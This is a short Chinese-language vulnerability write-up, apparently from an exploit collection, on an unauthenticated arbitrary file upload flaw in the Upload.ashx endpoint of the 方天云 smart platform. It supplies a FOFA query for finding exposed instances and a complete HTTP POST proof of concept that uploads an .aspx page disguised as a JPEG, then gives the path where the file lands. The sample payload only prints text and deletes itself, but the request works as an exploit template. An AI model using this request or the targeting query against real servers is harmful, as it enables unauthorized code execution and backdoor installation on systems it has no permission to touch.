# 方天云智慧平台系统Upload.ashx存在任意文件上传漏洞

方天云智慧平台系统 Upload.ashx 接口处存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```java
body="AjaxMethods.asmx/GetCompanyItem"
```

## poc

```java
POST /Upload.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
Connection: close
 
------WebKitFormBoundarySl8siBbmVicABvTX
Content-Disposition: form-data; name="file"; filename="qwe.aspx"
Content-Type: image/jpeg
 
<%@Page Language="C#"%><%Response.Write("hello");System.IO.File.Delete(Request.PhysicalPath);%>
------WebKitFormBoundarySl8siBbmVicABvTX--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407311743390.png)

文件路径：`/UploadFile/CustomerFile/回显的路径`

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407311744590.png)